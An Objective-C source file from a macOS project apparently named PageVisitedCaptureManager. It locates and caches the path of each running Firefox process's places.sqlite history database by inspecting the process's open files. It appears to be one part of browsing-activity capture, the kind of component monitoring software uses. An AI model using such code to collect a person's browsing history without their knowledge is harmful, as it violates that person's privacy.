//
//  FirefoxProfileManager.m
//  PageVisitedCaptureManager
//
//  Created by Makara Khloth on 11/14/16.
//
//

#import "FirefoxProfileManager.h"

#import "SystemUtilsImpl.h"

static FirefoxProfileManager *_FirefoxProfileManager = nil;

@implementation FirefoxProfileManager

@synthesize mLock, mFirefoxPlaces;

+ (instancetype) sharedManager {
    if (_FirefoxProfileManager == nil) {
        _FirefoxProfileManager = [[FirefoxProfileManager alloc] init];
        _FirefoxProfileManager.mLock = [[[NSLock alloc] init] autorelease];
        _FirefoxProfileManager.mFirefoxPlaces = [NSMutableDictionary dictionary];
        
        [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:_FirefoxProfileManager selector:@selector(targetDidTerminate:) name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    }
    return _FirefoxProfileManager;
}

- (NSString *) getPlacesPathOfPID: (pid_t) aPID {
    [self.mLock lock];
    
    NSString *placesPath = [self.mFirefoxPlaces objectForKey:[NSNumber numberWithInt:aPID]];
    if (!placesPath) {
        /*
        NSString *cmd = [NSString stringWithFormat:@"lsof -p %d | grep -m 1 'places.sqlite$'", aPID];
        NSTask *task = [[NSTask alloc] init];
        [task setLaunchPath:@"/bin/sh"];
        [task setArguments:@[@"-c", cmd]];
        
        NSPipe *output = [NSPipe pipe];
        [task setStandardOutput:output];
        
        [task launch];
        //[task waitUntilExit];
        [task release];
        
        NSFileHandle *fileHandle = [output fileHandleForReading];
        NSData *data = [fileHandle readDataToEndOfFile];
        NSString *strCMD = [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease];
        strCMD = [strCMD stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        
        NSString *subpath = [[strCMD componentsSeparatedByString:@" /"] lastObject];
        if (subpath.length > 0) {
            placesPath = [NSString stringWithFormat:@"/%@", subpath];
        }*/
        
        NSArray *lsof = [SystemUtilsImpl listOfOpenFileByPID:aPID];
        for (NSString *filePath in lsof) {
            if ([[filePath lastPathComponent] isEqualToString:@"places.sqlite"]) {
                placesPath = filePath;
                break;
            }
        }
        
        DLog(@"places.sqlite path by PID : %@", placesPath);
        
        if (placesPath) {
            [self.mFirefoxPlaces setObject:placesPath forKey:[NSNumber numberWithInt:aPID]];
        }
    }
    
    [self.mLock unlock];
    
    return placesPath;
}

- (void) targetDidTerminate:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSString *appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    if ([appBundleIdentifier isEqualToString:@"org.mozilla.firefox"]) {
        NSNumber *pid = [userInfo objectForKey:@"NSApplicationProcessIdentifier"];
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
            [self.mLock lock];
            [self.mFirefoxPlaces removeObjectForKey:pid];
            [self.mLock unlock];
            DLog(@"Profiles of running Firefoxs : %@", self.mFirefoxPlaces);
        });
    }
}

- (void) dealloc {
    [mLock release];
    [mFirefoxPlaces release];
    [super dealloc];
}

@end
